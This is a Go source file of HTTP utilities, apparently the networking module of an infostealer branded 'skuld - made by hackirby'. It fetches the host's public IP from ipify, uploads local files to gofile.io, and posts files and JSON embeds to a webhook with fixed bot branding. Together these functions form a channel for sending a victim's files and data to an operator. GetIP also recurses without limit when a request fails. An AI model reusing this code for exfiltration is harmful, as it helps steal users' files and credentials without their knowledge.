package requests

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
)

func Get(url string, headers ...map[string]string) ([]byte, error) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	if len(headers) > 0 {
		for key, value := range headers[0] {
			req.Header.Set(key, value)
		}
	}
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	res, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return res, nil
}

func GetIP() string {
	res, err := Get("https://api.ipify.org")
	if err != nil {
		return GetIP()
	}
	return string(res)
}

func Post(url string, body []byte, headers ...map[string]string) ([]byte, error) {
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(body))
	if err != nil {
		return nil, err
	}
	if len(headers) > 0 {
		for key, value := range headers[0] {
			req.Header.Set(key, value)
		}
	}
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	res, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return res, nil
}

func Upload(file string) (string, error) {
	res, err := Get("https://api.gofile.io/getServer")
	if err != nil {
		return "", err
	}

	var server struct {
		Status string `json:"status"`
		Data   struct {
			Server string `json:"server"`
		} `json:"data"`
	}

	if err := json.Unmarshal(res, &server); err != nil {
		return "", err
	}

	if server.Status != "ok" {
		return "", fmt.Errorf("error getting server")
	}

	var body bytes.Buffer
	writer := multipart.NewWriter(&body)
	fw, err := writer.CreateFormFile("file", file)

	if err != nil {
		return "", err
	}

	fd, err := os.Open(file)
	if err != nil {
		return "", err
	}

	defer fd.Close()

	_, err = io.Copy(fw, fd)
	if err != nil {
		return "", err
	}

	writer.Close()

	res, err = Post(fmt.Sprintf("https://%s.gofile.io/uploadFile", server.Data.Server), body.Bytes(), map[string]string{"Content-Type": writer.FormDataContentType()})
	if err != nil {
		return "", err
	}

	var response struct {
		Data struct {
			DownloadPage string `json:"downloadPage"`
		} `json:"data"`
	}

	if err := json.Unmarshal(res, &response); err != nil {
		return "", err
	}

	if response.Data.DownloadPage == "" {
		return "", fmt.Errorf("error uploading file")
	}

	return response.Data.DownloadPage, nil
}

func Webhook(webhook string, data map[string]interface{}, files ...string) {
	var body bytes.Buffer
	writer := multipart.NewWriter(&body)

	i := 0

	if len(files) > 10 {
		Webhook(webhook, data)
		for _, file := range files {
			i++
			Webhook(webhook, map[string]interface{}{"content": fmt.Sprintf("Attachment %d: `%s`", i, file)}, file)
		}
		return
	}

	for _, file := range files {
		openedFile, err := os.Open(file)
		if err != nil {
			continue
		}
		defer openedFile.Close()

		filePart, err := writer.CreateFormFile(fmt.Sprintf("file[%d]", i), openedFile.Name())
		if err != nil {
			continue
		}

		if _, err := io.Copy(filePart, openedFile); err != nil {
			continue
		}
		i++
	}

	jsonPart, err := writer.CreateFormField("payload_json")
	if err != nil {
		return
	}

	data["username"] = "skuld"
	data["avatar_url"] = "https://i.ibb.co/GFZ2tHJ/shakabaiano-1674282487.jpg"

	if data["embeds"] != nil {
		for _, embed := range data["embeds"].([]map[string]interface{}) {
			embed["footer"] = map[string]interface{}{
				"text":     "skuld - made by hackirby",
				"icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
			}
			embed["color"] = 0xb143e3
		}
	}

	if err := json.NewEncoder(jsonPart).Encode(data); err != nil {
		return
	}

	if err := writer.Close(); err != nil {
		return
	}

	Post(webhook, body.Bytes(), map[string]string{"Content-Type": writer.FormDataContentType()})
}
